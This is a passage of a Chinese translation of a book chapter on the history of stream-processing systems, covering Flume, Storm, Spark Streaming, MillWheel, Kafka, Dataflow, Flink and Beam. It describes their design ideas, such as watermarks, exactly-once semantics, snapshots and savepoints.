alt></p><p>将两个阶段融合在一起消除了序列化 / 反序列化和网络开销，这在处理大量数据的底层 Pipeline 中非常重要。</p><p>另一种类型的自动优化是 combiner lifting（见图 10-12），当我们讨论增量合并时，我们已经在第 7 章中讨论了这些机制。combiner lifting 只是我们在该章讨论的多级组合逻辑的编译器自动优化：以求和操作为例，求和的合并逻辑本来应该运算在分组 (译者注: 即 Group-By) 操作后，由于优化的原因，被提前到在 group-by-key 之前做局部求和（根据 group-by-key 的语义，经过 group-by-key 操作需要跨网络进行大量数据 Shuffle）。在出现数据热点情况下，将这个操作提前可以大大减少通过网络 Shuffle 的数据量，并且还可以在多台机器上分散掉最终聚合的机器负载。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78n948fj20u00dxmx9.jpg" alt></p><p>由于其更清晰的 API 定义和自动优化机制，在 2009 年初 Google 内部推出后 FlumeJava 立即受到巨大欢迎。之后，该团队发表了题为《Flume Java: Easy, Efficient Data-Parallel Pipelines》（<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/35650.pdf）" target="_blank" rel="noopener">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/35650.pdf）</a> 的论文（参见图 10-13），这篇论文本身就是一个很好的学习 FlumeJava 的资料。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78xgh4qj20u00mewi2.jpg" alt></p><p>Flume C++ 版本很快于 2011 年发布。之后 2012 年初，Flume 被引入为 Google 的所有新工程师提供的 Noogler6 培训内容。MapReduce 框架于是最终被走向被替换的命运。</p><p>从那时起，Flume 已经迁移到不再使用 MapReduce 作为执行引擎 ; 相反，Flume 底层基于一个名为 Dax 的内置自定义执行引擎。 工作本身。不仅让 Flume 更加灵活选择执行计划而不必拘泥于 Map→Shuffle→Reduce MapReduce 的模型，Dax 还启用了新的优化，例如 Eugene Kirpi-chov 和 Malo Denielou 的《No shard left behind》博客文章（<a href="https://cloud.google.com/blog/products/gcp/no-shard-left-behind-dynamic-work-rebalancing-in-google-cloud-dataflow）" target="_blank" rel="noopener">https://cloud.google.com/blog/products/gcp/no-shard-left-behind-dynamic-work-rebalancing-in-google-cloud-dataflow）</a> 中描述的动态负载均衡（图 10-14）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h796bl2pj20u00kwabc.jpg" alt></p><p>尽管那篇博客主要是基于 Google DataFlow 框架下讨论问题，但动态负载均衡（或液态分片，Google 内部更习惯这样叫）可以让部分已经完成工作的 Worker 能够从另外一些繁忙的 Worker 手中分配一些额外的工作。在 Job 运行过程中，通过不断的动态调整负载分配可以将系统运行效率趋近最优，这种算法将比传统方法下有经验工程师手工设置的初始参数性能更好。Flume 甚至为 Worker 池变化进行了适配，一个拖慢整个作业进度的 Worker 会将其任务转移到其他更加高效的 Worker 上面进行执行。Flume 的这些优化手段，在 Google 内部为公司节省了大量资源。</p><p>最后一点，Flume 后来也被扩展为支持流语义。除 Dax 作为一个批处理系统引擎外，Flume 还扩展为能够在 MillWheel 流处理系统上执行作业（稍后讨论）。在 Google 内部，之前本书中讨论过的大多数高级流处理语义概念首先被整合到 Flume 中，然后才进入 Cloud Dataflow 并最终进入 Apache Beam。</p><p>总而言之，本节我们主要强调的是 Flume 产品给人引入高级管道概念，这使得能够让用户编写清晰易懂且自动优化的分布式大数据处理逻辑，从而让创建更大型更复杂的分布式大数据任务成为了可能，Flume 让我们业务代码在保持代码清晰逻辑干净的同时，自动具备编译器优化能力。</p><h3 id="strom"><a href="#strom" class="headerlink" title="strom"></a>strom</h3><p>接下来是 Apache Storm（图 10-15），这是我们研究的第一个真正的流式系统。 Storm 肯定不是业界使用最早的流式处理系统，但我认为这是整个行业真正广泛采用的第一个流式处理系统，因此我们在这里需要仔细研究一下。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79kbcyqj20u00dwglt.jpg" alt></p><p>Storm 是 Nathan Marz 的心血结晶，Nathan Marz 后来在一篇题为《History of Apache Storm and lessons learned》的博客文章（<a href="http://nathanmarz.com/blog/history-of-apache-storm-and-lessons-learned.html）" target="_blank" rel="noopener">http://nathanmarz.com/blog/history-of-apache-storm-and-lessons-learned.html）</a> 中记录了其创作历史（图 10-16）。 这篇冗长的博客讲述了 BackType 这家创业公司一直在自己通过消息队列和自定义代码去处理 Twitter 信息流。Nathan 和十几年前 Google 里面设计 MapReduce 相关工程师有相同的认识：实际的业务处理的代码仅仅是系统代码很小一部分，如果有个统一的流式实时处理框架负责处理各类分布式系统底层问题，那么基于之上构建我们的实时大数据处理将会轻松得多。基于此，Nathan 团队完成了 Storm 的设计和开发。</p><p>值得一提的是，Storm 的设计原则和其他系统大相径庭，Storm 更多考虑到实时流计算的处理时延而非数据的一致性保证。后者是其他大数据系统必备基础产品特征之一。Storm 针对每条流式数据进行计算处理，并提供至多一次或者至少一次的语义保证；同时不提供任何状态存储能力。相比于 Batch 批处理系统能够提供一致性语义保证，Storm 系统能够提供更低的数据处理延迟。对于某些数据处理业务场景来说，这确实也是一个非常合理的取舍。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79pvt78j20u00jt75d.jpg" alt></p><p>不幸的是，人们很快就清楚地知道他们想要什么样的流式处理系统。他们不仅希望快速得到业务结果，同时希望系统具有低延迟和准确性，但仅凭 Storm 架构实际上不可能做到这一点。针对这个情况，Nathan 后面又提出了 Lambda 架构。</p><p>鉴于 Storm 的局限性，聪明的工程师结合弱一致语义的 Storm 流处理以及强一致语义的 Hadoop 批处理。前者产生了低延迟，但不精确的结果，而后者产生了高延迟，但精确的结果，双剑合璧，整合两套系统整体提供的低延迟但最终一致的输出结果。我们在第 1 章中了解到，Lambda 架构是 Marz 的另一个创意，详见他的文章《“如何击败 CAP 定理”》（<a href="http://nathanmarz.com/blog/how-to-beat-the-cap-theorem.html）" target="_blank" rel="noopener">http://nathanmarz.com/blog/how-to-beat-the-cap-theorem.html）</a> （图 10-17）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79w7p4ej20u00oj0ve.jpg" alt></p><p>我已经花了相当多的时间来分析 Lambda 架构的缺点，以至于我不会在这里啰嗦这些问题。但我要重申一下：尽管它带来了大量成本问题，Lambda 架构当前还是非常受欢迎，仅仅是因为它满足了许多企业一个关键需求：系统提供低延迟但不准确的数据，后续通过批处理系统纠正之前数据，最终给出一致性的结果。从流处理系统演变的角度来看，Storm 确实为普罗大众带来低延迟的流式实时数据处理能力。然而，它是以牺牲数据强一致性为代价的，这反过来又带来了 Lambda 架构的兴起，导致接下来多年基于两套系统架构之上的数据处理带来无尽的麻烦和成本。</p><p>撇开其他问题先不说，Storm 是行业首次大规模尝试低延迟数据处理的系统，其影响反映在当前线上大量部署和应用各类流式处理系统。在我们要放下 Storm 开始聊其他系统之前，我觉得还是很有必要去说说 Heron 这个系统。在 2015 年，Twitter 作为 Storm 项目孵化公司以及世界上已知最大的 Storm 用户，突然宣布放弃 Storm 引擎，宣称正在研发另外一套称之为 Heron 的流式处理框架。Heron 旨在解决困扰 Storm 的一系列性能和维护问题，同时向 Storm 保持 API 兼容，详见题为《Twitter Heron：Stream Processing at scale》的论文（<a href="https://www.semanticscholar.org/paper/Twitter-Heron%3A-Stream-Processing-at-Scale-Kulkarni-Bhagat/e847c3ec130da57328db79a7fea794b07dbccdd9）" target="_blank" rel="noopener">https://www.semanticscholar.org/paper/Twitter-Heron%3A-Stream-Processing-at-Scale-Kulkarni-Bhagat/e847c3ec130da57328db79a7fea794b07dbccdd9）</a> （图 10-18）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7a341dvj20u00mtjv0.jpg" alt></p><p>Heron 本身也是开源产品（但开源不在 Apache 项目中）。鉴于 Storm 仍然在社区中持续发展，现在又冒出一套和 Storm 竞争的软件，最终两边系统鹿死谁手，我们只能拭目以待了。</p><h3 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h3><p>继续走起，我们现在来到 Apache Spark（图 10-19）。再次，我又将大量简化 Spark 系统对行业的总体影响探讨，仅仅关注我们的流处理领域部分。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7aed762j20u00dwq35.jpg" alt></p><p>Spark 在 2009 年左右诞生于加州大学伯克利分校的著名 AMPLab。最初推动 Spark 成名的原因是它能够经常在内存执行大量的计算工作，直到作业的最后一步才写入磁盘。工程师通过弹性分布式数据集（RDD）理念实现了这一目标，在底层 Pipeline 中能够获取每个阶段数据结果的所有派生关系，并且允许在机器故障时根据需要重新计算中间结果，当然，这些都基于一些假设 a）输入是总是可重放的，b）计算是确定性的。对于许多案例来说，这些先决条件是真实的，或者看上去足够真实，至少用户确实在 Spark 享受到了巨大的性能提升。从那时起，Spark 逐渐建立起其作为 Hadoop 事实上的继任产品定位。</p><p>在 Spark 创建几年后，当时 AMPLab 的研究生 Tathagata Das 开始意识到：嘿，我们有这个快速的批处理引擎，如果我们将多个批次的任务串接起来，用它能否来处理流数据？于是乎，Spark Streaming 诞生了。</p><p>关于 Spark Streaming 的真正精彩之处在于：强大的批处理引擎解决了太多底层麻烦的问题，如果基于此构建流式处理引擎则整个流处理系统将简单很多，于是世界又多一个流处理引擎，而且是可以独自提供一致性语义保障的流式处理系统。换句话说，给定正确的用例，你可以不用 Lambda 架构系统直接使用 Spark Streaming 即可满足数据一致性需求。为 Spark Streaming 手工点赞！</p><p>这里的一个主要问题是“正确的用例”部分。早期版本的 Spark Streaming（1.x 版本）的一大缺点是它仅支持特定的流处理语义：即，处理时间窗口。因此，任何需要使用事件时间，需要处理延迟数据等等案例都无法让用户使用 Spark 开箱即用解决业务。这意味着 Spark Streaming 最适合于有序数据或事件时间无关的计算。而且，正如我在本书中重申的那样，在处理当今常见的大规模、以用户为中心的数据集时，这些先决条件看上去并不是那么常见。</p><p>围绕 Spark Streaming 的另一个有趣的争议是“microbatch 和 true streaming”争论。由于 Spark Streaming 建立在批处理引擎的重复运行的基础之上，因此批评者声称 Spark Streaming 不是真正的流式引擎，因为整个系统的处理基于全局的数据切分规则。这个或多或少是实情。尽管流处理引擎几乎总是为了吞吐量而使用某种批处理或者类似的加大吞吐的系统策略，但它们可以灵活地在更精细的级别上进行处理，一直可以细化到某个 key。但基于微批处理模型的系统在基于全局切分方式处理数据包，这意味着同时具备低延迟和高吞吐是不可能的。确实我们看到许多基准测试表明这说法或多或少有点正确。当然，作业能够做到几分钟或几秒钟的延迟已经相当不错了，实际上生产中很少有用例需要严格数据正确性和低延迟保证。所以从某种意义上说，Spark 瞄准最初目标客户群体打法是非常到位的，因为大多数业务场景均属于这一类。但这并未阻止其竞争对手将此作为该平台的巨大劣势。就个人而言，在大多数情况下，我认为这只是一个很小问题。</p><p>撇开缺点不说，Spark Streaming 是流处理的分水岭：第一个广泛使用的大规模流处理引擎，它也可以提供批处理系统的正确性保证。 当然，正如前面提到的，流式系统只是 Spark 整体成功故事的一小部分，Spark 在迭代处理和机器学习领域做出了重要贡献，其原生 SQL 集成以及上述快如闪电般的内存计算，都是非常值得大书特书的产品特性。</p><p>如果您想了解有关原始 Spark 1.x 架构细节的更多信息，我强烈推荐 Matei Zaharia 关于该主题的论文《 “An Architecture for Fast and General Data Processing on Large Clusters》（图 10-20）。 这是 113 页的 Spark 核心讲解论文，非常值得一读。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7aler0xj20u00srwi6.jpg" alt></p><p>时至今日，Spark 的 2.x 版本极大地扩展了 Spark Streaming 的语义功能，其中已经包含了本书中描述流式处理模型的许多部分，同时试图简化一些更复杂的设计。 Spark 甚至推出了一种全新的、真正面向流式处理的架构，用以规避掉微批架构的种种问题。但是曾经，当 Spark 第一次出现时，它带来的重要贡献是它是第一个公开可用的流处理引擎，具有数据处理的强一致性语义，尽管这个特性只能用在有序数据或使用处理时间计算的场景。</p><h3 id="MillWheel"><a href="#MillWheel" class="headerlink" title="MillWheel"></a>MillWheel</h3><p>接下来我们讨论 MillWheel，这是我在 2008 年加入 Google 后的花 20％时间兼职参与的项目，后来在 2010 年全职加入该团队（图 10-21）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7bomue7j20u00dwt8x.jpg" alt></p><p>MillWheel 是 Google 最早的通用流处理架构，该项目由 Paul Nordstrom 在 Google 西雅图办事处开业时发起。 MillWheel 在 Google 内的成功与长期以来一直致力于为无序数据提供低延迟，强一致的处理能力不无关系。在本书的讲解中，我们已经多次分别讨论了促使 MillWheel 成为一款成功产品的方方面面。</p><ul><li>第五章，Reuven 详细讨论过数据精准一次的语义保证。精准一次的语义保证对于正确性至关重要。</li><li>第七章，我们研究了状态持久化，这为在不那么靠谱的普通硬件上执行的长时间数据处理业务并且需要保证正确性奠定了基础。</li><li>第三章，Slava 讨论了 Watermark。Watermark 为处理无序数据提供了基础。</li><li>第七章，我们研究了持久性计时器，它们提供了 Watermark 与业务逻辑之间的某些关联特性。</li></ul><p>有点令人惊讶的是，MillWheel 项目最开始并未关注数据正确性。保罗最初的想法更接近于 Storm 的设计理论：具有弱一致性的低延迟数据处理。这是最初的 MillWheel 客户，一个关于基于用户搜索数据构建会话和另一个对搜索查询执行异常检测（来自 MillWheel 论文的 Zeitgeist 示例），这两家客户迫使项目走向了正确的方向。两者都非常需要强一致的数据结果：会话用于推断用户行为，异常检测用于推断搜索查询的趋势 ; 如果他们提供的数据不靠谱，两者效果都会显着下降。最终，幸运的是，MillWheel 的设计被客户需求导向追求数据强一致性的结果。</p><p>支持乱序数据处理，这是现代流式处理系统的另一个核心功能。这个核心功能通常也被认为是被 MillWheel 引入到流式处理领域，和数据准确性一样，这个功能也是被客户需求推动最终加入到我们系统。 Zeitgeist 项目的大数据处理过程，通常被我们拿来用作一个真正的流式处理案例来讨论。Zeitgeist 项目希望检测识别搜索查询流量中的异常，并且需要捕获异常流量。对于这个大数据项目数据消费者来说，流计算将所有计算结果产出并让用户轮询所有 key 用来识别异常显然不太现实，数据用户要求系统直接计算某个 key 出现异常的数据结果，而不需要上层再来轮询。对于异常峰值（即查询流量的增加），这还相对来说比较简单好解决：当给定查询的计数超过查询的预期值时，系统发出异常信号。但是对于异常下降（即查询流量减少），问题有点棘手。仅仅看到给定搜索词的查询数量减少是不够的，因为在任何时间段内，计算结果总是从零开始。在这些情况下你必须确保你的数据输入真的能够代表当前这段时间真实业务流量，然后才将计算结果和预设模型进行比较。</p><blockquote><p><strong>真正的流式处理</strong></p></blockquote><blockquote><p>“真正的流式处理用例”需要一些额外解释。流式系统的一个新的演化趋势是，舍弃掉部分产品需求以简化编程模型，从而使整个系统简单易用。例如，在撰写本文时，Spark Structured Streaming 和 Apache Kafka Streams 都将系统提供的功能限制在第 8 章中称为“物化视图语义”范围内，本质上对最终一致性的输出表不停做数据更新。当您想要将上述输出表作为结果查询使用时，物化视图语义非常匹配你的需求：任何时候我们只需查找该表中的值并且 (译者注: 尽管结果数据一直在不停被更新和改变) 以当前查询时间请求到查询结果就是最新的结果。但在一些需要真正流式处理的场景，例如异常检测，上述物化视图并不能够很好地解决这类问题。</p></blockquote><blockquote><p>接下来我们会讨论到，异常检测的某些需求使其不适合纯物化视图语义（即，依次针对单条记录处理），特别当需要完整的数据集才能够识别业务异常，而这些异常恰好是由于数据的缺失或者不完整导致的。另外，不停轮询结果表以查看是否有异常其实并不是一个扩展性很好的办法。真正的流式用户场景是推动 watermark 等功能的原始需求来源。(Watermark 所代表的时间有先有后，我们需要最低的 Watermark 追踪数据的完整性，而最高的 Watermark 在数据时间发生倾斜时候非常容易导致丢数据的情况发生，类似 Spark Structured Streaming 的用法)。省略类似 Watermark 等功能的系统看上去简单不少，但换来代价是功能受限。在很多情况下，这些功能实际上有非常重要的业务价值。但如果这样的系统声称这些简化的功能会带来系统更多的普适性，不要听他们忽悠。试问一句，功能需求大量被砍掉，如何保证系统的普适性呢？</p></blockquote><p>Zeitgeist 项目首先尝试通过在计算逻辑之前插入处理时间的延迟数值来解决数据延迟问题。当数据按顺序到达时，这个思路处理逻辑正常。但业务人员随后发现数据有时可能会延迟很大，从而导致数据无序进入流式处理系统。一旦出现这个情况，系统仅仅采用处理时间的延迟是不够的，因为底层数据处理会因为数据乱序原因被错误判断为异常。最终，我们需要一种等待数据到齐的机制。</p><p>之后 Watermark 被设计出来用以解决数据乱序的问题。正如 Slava 在第 3 章中所描述的那样，基本思想是跟踪系统输入数据的当前进度，对于每个给定的数据源，构建一个数据输入进度用来表征输入数据的完整性。对于一些简单的数据源，例如一个带分区的 Kafka Topic，每个 Topic 下属的分区被写入的是业务时间持续递增的数据（例如通过 Web 前端实时记录的日志事件），这种情况下我们可以计算产生一个非常完美的 Watermark。但对于一些非常复杂的数据输入，例如动态的输入日志集，一个启发式算法可能是我们能够设计出来最能解决业务问题的 Watermark 生成算法了。但无论哪种方式，Watermark 都是解决输入事件完整性最佳方式。之前我们尝试使用处理时间来解决事件输入完整性，有点驴头不及马嘴的感觉。</p><p>得益于客户的需求推动，MillWheel 最终成为能够支持无序数据的强大流处理引擎。因此，题为《MillWheel: Fault-Tolerant Stream Processing at Internet Scale》（图 10-22）的论文花费大部分时间来讨论在这样的系统中提供正确性的各种问题，一致性保证、Watermark。如果您对这个主题感兴趣，那值得花时间去读读这篇论文。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7c6d50hj20u00jrdix.jpg" alt></p><p>MillWheel 论文发表后不久，MillWheel 就成为 Flume 底层提供支撑的流式处理引擎，我们称之为 Streaming Flume。今天在谷歌内部，MillWheel 被下一代理论更为领先的系统所替换: Windmill（这套系统同时也为 DataFlow 提供了执行引擎），这是一套基于 MillWheel 之上，博采众家之长的大数据处理系统，包括提供更好的调度和分发策略、更清晰的框架和业务代码解耦。</p><p>MillWheel 给我们带来最大的价值是之前列出的四个概念（数据精确一次性处理，持久化的状态存储，Watermark，持久定时器）为流式计算提供了工业级生产保障：即使在不可靠的商用硬件上，也可以对无序数据进行稳定的、低延迟的处理。</p><h3 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h3><p>我们开始讨论 Kafka（图 10-23）。 Kafka 在本章讨论的系统中是独一无二的，因为它不是数据计算框架，而是数据传输和存储的工具。但是，毫无疑问，Kafka 在我们正在讨论的所有系统中扮演了推动流处理的最有影响力的角色之一。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7citnfkj20u00dwt8x.jpg" alt></p><p>如果你不熟悉它，我们可以简单描述为: Kafka 本质上是一个持久的流式数据传输和存储工具，底层系统实现为一组带有分区结构的日志型存储。它最初是由 Neha Narkhede 和 Jay Kreps 等业界大牛在 LinkedIn 公司内部开发的，其卓越的特性有:</p><ul><li>提供一个干净的持久性模型，让大家在流式处理领域里面可以享受到批处理的产品特性，例如持久化、可重放。</li><li>在生产者和消费者之间提供弹性隔离。</li><li>我们在第 6 章中讨论过的流和表之间的关系，揭示了思考数据处理的基本方式，同时还提供了和数据库打通的思路和概念。</li><li>来自于上述所有方面的影响，不仅让 Kafka 成为整个行业中大多数流处理系统的基础，而且还促进了流处理数据库和微服务运动。</li></ul><p>在这些特性中，有两个对我来说最为突出。第一个是流数据的持久化和可重放性的应用。在 Kafka 之前，大多数流处理系统使用某种临时、短暂的消息系统，如 Rabbit MQ 甚至是普通的 TCP 套接字来发送数据。数据处理的一致性往往通过生产者数据冗余备份来实现（即，如果下游数据消费者出现故障，则上游生产者将数据进行重新发送），但是上游数据的备份通常也是临时保存一下。大多数系统设计完全忽略在开发和测试中需要重新拉取数据重新计算的需求。但 Kafka 的出现改变了这一切。从数据库持久日志概念得到启发并将其应用于流处理领域，Kafka 让我们享受到了如同 Batch 数据源一样的安全性和可靠性。凭借持久化和可重放的特点，流计算在健壮性和可靠性上面又迈出关键的一步，为后续替代批处理系统打下基础。</p><p>作为一个流式系统开发人员，Kafka 的持久化和可重放功能对业界产生一个更有意思的变化就是: 当今大量流处理引擎依赖源头数据可重放来提供端到端精确一次的计算保障。可重放的特点是 Apex，Flink，Kafka Streams，Spark 和 Storm 的端到端精确一次保证的基础。当以精确一次模式执行时，每个系统都假设 / 要求输入数据源能够重放之前的部分数据 (从最近 Checkpoint 到故障发生时的数据)。当流式处理系统与不具备重放能力的输入源一起使用时（哪怕是源头数据能够保证可靠的一致性数据投递，但不能提供重放功能），这种情况下无法保证端到端的完全一次语义。这种对可重放（以及持久化等其他特点）的广泛依赖是 Kafka 在整个行业中产生巨大影响的间接证明。</p><p>Kafka 系统中第二个值得注意的重点是流和表理论的普及。我们花了整个第 6 章以及第 8 章、第 9 章来讨论流和表，可以说流和表构成了数据处理的基础，无论是 MapReduce 及其演化系统，SQL 数据库系统，还是其他分支的数据处理系统。并不是所有的数据处理方法都直接基于流或者表来进行抽象，但从概念或者理论上说，表和流的理论就是这些系统的运作方式。作为这些系统的用户和开发人员，理解我们所有系统构建的核心基础概念意义重大。我们都非常感谢 Kafka 社区的开发者，他们帮助我们更广泛更加深入地了解到批流理论。</p><p>如果您想了解更多关于 Kafka 及其理论核心，JackKreps 的《I❤Logs》（O’Reilly; 图 10-24）是一个很好的学习资料。另外，正如第 6 章中引用的那样，Kreps 和 Martin Kleppmann 有两篇文章（图 10-25），我强烈建议您阅读一下关于流和表相关理论。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7cqke9dj20dw0i80tf.jpg" alt></p><p>Kafka 为流处理领域做出了巨大贡献，可以说比其他任何单一系统都要多。特别是，对输入和输出流的持久性和可重放的设计，帮助将流计算从近似工具的小众领域发展到在大数据领域妇孺皆知的程度起了很大作用。此外，Kafka 社区推广的流和表理论对于数据处理引发了我们深入思考。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7cwnv5vj20u00clq3j.jpg" alt></p><h3 id="DataFlow"><a href="#DataFlow" class="headerlink" title="DataFlow"></a>DataFlow</h3><p>Cloud Dataflow（图 10-26）是 Google 完全托管的、基于云架构的数据处理服务。 Dataflow 于 2015 年 8 月推向全球。DataFlow 将 MapReduce，Flume 和 MillWheel 的十多年经验融入其中，并将其打包成 Serverless 的云体验。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7d644kqj20u00qe0xe.jpg" alt></p><p>虽然 Google 的 Dataflow 的 Serverless 特点可能是从系统角度来看最具技术挑战性以及有别于其他云厂商产品的重要因素，但我想在此讨论主要是其批流统一的编程模型。编程模型包括我们在本书的大部分内容中所讨论的转换，窗口，水印，触发器和聚合计算。当然，所有这些讨论都包含了思考问题的 what、where、when、how。</p><p>DataFlow 模型首先诞生于 Flume，因为我们希望将 MillWheel 中强大的无序数据计算能力整合到 Flume 提供的更高级别的编程模型中。这个方式可以让 Google 员工在内部使用 Flume 进行统一的批处理和流处理编程。</p><p>关于统一模型的核心关键思考在于，尽管在当时我们也没有深刻意识到，批流处理模型本质上没有区别: 仅仅是在表和流的处理上有些小变化而已。正如我们在第 6 章中所讨论到的，主要的区别仅仅是在将表上增量的变化转换为流，其他一切在概念上是相同的。通过利用批处理和流处理两者大量的共性需求，可以提供一套引擎，适配于两套不同处理方式，这让流计算系统更加易于使用。</p><p>除了利用批处理和流处理之间的系统共性之外，我们还仔细查看了多年来我们在 Google 中遇到的各种案例，并使用这些案例来研究统一模型下系统各个部分。我们研究主要内容如下：</p><ul><li>未对齐的事件时间窗口（如会话窗口），能够简明地表达这类复杂的分析，同时亦能处理乱序数据。</li><li>自定义窗口支持，系统内置窗口很少适合所有业务场景，需要提供给用户自定义窗口的能力。</li><li>灵活的触发和统计模式，能够满足正确性，延迟，成本的各项业务需求。</li><li>使用 Watermark 来推断输入数据的完整性，这对于异常检测等用例至关重要，其中异常检测逻辑会根据是否缺少数据做出异常判断。</li><li>底层执行环境的逻辑抽象，无论是批处理，微批处理还是流式处理，都可以在执行引擎中提供灵活的选择，并避免系统级别的参数设置（例如微批量大小）进入逻辑 API。</li></ul><p>总之，这些平衡了灵活性，正确性，延迟和成本之间的关系，将 DataFlow 的模型应用于大量用户业务案例之中。</p><p>考虑到我们之前整本书都在讨论 DataFlow 和 Beam 模型的各类问题，我在此处重新给大家讲述这些概念纯属多此一举。但是，如果你正在寻找稍微更具学术性的内容以及一些应用案例，我推荐你看下 2015 年发表的《DataFlow 论文..》（图 10-27）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7dd2y3uj20u00qe0xe.jpg" alt></p><p>DataFlow 还有不少可以大书特书的功能特点，但在这章内容构成来看，我认为 DataFlow 最重要的是构建了一套批流统一的大数据处理模型。DataFlow 为我们提供了一套全面的处理无界且无序数据集的能力，同时这套系统很好的平衡了正确性、延迟、成本之间的相互关系。</p><h3 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h3><p>Flink（图 10-28）在 2015 年突然出现在大数据舞台，然后似乎在一夜之间从一个无人所知的系统迅速转变为人人皆知的流式处理引擎。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7doer6ij20u00dwaaa.jpg" alt></p><p>在我看来，Flink 崛起有两个主要原因：</p><ul><li>采用 Dataflow/Beam 编程模型，使其成为完备语义功能的开源流式处理系统。</li><li>其高效的快照实现方式，源自 Chandy 和 Lamport 的原始论文《“Distributed Snapshots: Determining Global States of Distributed Systems”》的研究，这为其提供了正确性所需的强一致性保证。</li></ul><p>Reuven 在第 5 章中简要介绍了 Flink 的一致性机制，这里在重申一下，其基本思想是在系统中的 Worker 之间沿着数据传播路径上产生周期性 Barrier。这些 Barrier 充当了在不同 Worker 之间传输数据时的对齐机制。当一个 Worker 在其所有上游算子输入来源（即来自其所有上游一层的 Worker）上接收到全部 Barrier 时，Worker 会将当前所有 key 对应的状态写入一个持久化存储。这个过程意味着将这个 Barrier 之前的所有数据都做了持久化。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7du1knjj20u00qbwha.jpg" alt></p><p>通过调整 Barrier 的生成频率，可以间接调整 Checkpoint 的执行频率，从而降低时延并最终获取更高的吞吐（其原因是做 Checkpoint 过程中涉及到对外进行持久化数据，因此会有一定的 IO 导致延时）。</p><p>Flink 既能够支持精确一次的语义处理保证，同时又能够提供支持事件时间的处理能力，这让 Flink 获取的巨大的成功。接着， Jamie Grier 发表他的题为“《Extending the Yahoo! Streaming Benchmark》“（图 10-30）的文章，文章中描述了 Flink 性能具体的测试数据。在那篇文章中，杰米描述了两个令人印象深刻的特点：</p><ol><li><p>构建一个用于测试的 Flink 数据管道，其拥有比 Twitter Storm 更高的准确性（归功于 Flink 的强一次性语义），但成本却降到了 1％。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7e1vjk5j20u00wwq5v.jpg" alt></p><ol start="2"><li><p>Flink 在精确一次的处理语义参数设定下，仍然达到 Storm 的 7.5 倍吞吐量（而且，Storm 还不具备精确一次的处理语义）。此外，由于网络被打满导致 Flink 的性能受到限制 ; 进一步消除网络瓶颈后 Flink 的吞吐量几乎达到 Storm 的 40 倍。</p><p>从那时起，许多其他流式处理项目（特别是 Storm 和 Apex）都采用了类似算法的数据处理一致性机制。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7ec9lylj20u00vk0u6.jpg" alt></p><p>通过快照机制，Flink 获得了端到端数据一致性。Flink 更进了一步，利用其快照的全局特性，提供了从过去的任何一点重启整个管道的能力，这一功能称为 SavePoint（在 Fabian Hueske 和 Michael Winters 的帖子 [《Savepoints: Turning Back Time》(<a href="https://data-artisans.com/blog/turning-back-time-savepoints)]" target="_blank" rel="noopener">https://data-artisans.com/blog/turning-back-time-savepoints)]</a> 中有所描述，[图 10-31]）。Savepoints 功能参考了 Kafka 应用于流式传输层的持久化和可重放特性，并将其扩展应用到整个底层 Pipeline。流式处理仍然遗留大量开放性问题有待优化和提升，但 Flink 的 Savepoints 功能是朝着正确方向迈出的第一步，也是整个行业非常有特点的一步。 如果您有兴趣了解有关 Flink 快照和保存点的系统构造的更多信息，请参阅《State Management in Apache Flink》（图 10-32），论文详细讨论了相关的实现。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7ein1n1j20u00qstdj.jpg" alt></p><p>除了保存点之外，Flink 社区还在不断创新，包括将第一个实用流式 SQL API 推向大规模分布式流处理引擎的领域，正如我们在第 8 章中所讨论的那样。 总之，Flink 的迅速崛起成为流计算领军角色主要归功于三个特点：</p><ol><li>整合行业里面现有的最佳想法（例如，成为第一个开源 DataFlow/Beam 模型）</li><li>创新性在表上做了大量优化，并将状态管理发挥更大价值，例如基于 Snapshot 的强一致性语义保证，Savepoints 以及流式 SQL。</li><li>迅速且持续地推动上述需求落地。</li></ol><p>另外，所有这些改进都是在开源社区中完成的，我们可以看到为什么 Flink 一直在不断提高整个行业的流计算处理标准。</p><h3 id="Beam"><a href="#Beam" class="headerlink" title="Beam"></a>Beam</h3><p>我们今天谈到的最后一个系统是 Apache Beam（图 10-33）。 Beam 与本章中的大多数其他系统的不同之处在于，它主要是编程模型，API 设计和可移植层，而不是带有执行引擎的完整系统栈。但这正是我想强调的重点：正如 SQL 作为声明性数据处理的通用语言一样，Beam 的目标是成为程序化数据处理的通用语言。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7evt7rkj20u00dw3yq.jpg" alt></p><p>具体而言，Beam 由许多组件组成：</p><ul><li>一个统一的批量加流式编程模型，继承自 Google DataFlow 产品设计，以及我们在本书的大部分内容中讨论的细节。该模型独立于任何语言实现或 runtime 系统。您可以将此视为 Beam 等同于描述关系代数模型的 SQL。</li><li>一组实现该模型的 SDK（软件开发工具包），允许底层的 Pipeline 以不同 API 语言的惯用方式编排数据处理模型。 Beam 目前提供 Java，Python 和 Go 的 SDK，可以将它们视为 Beam 的 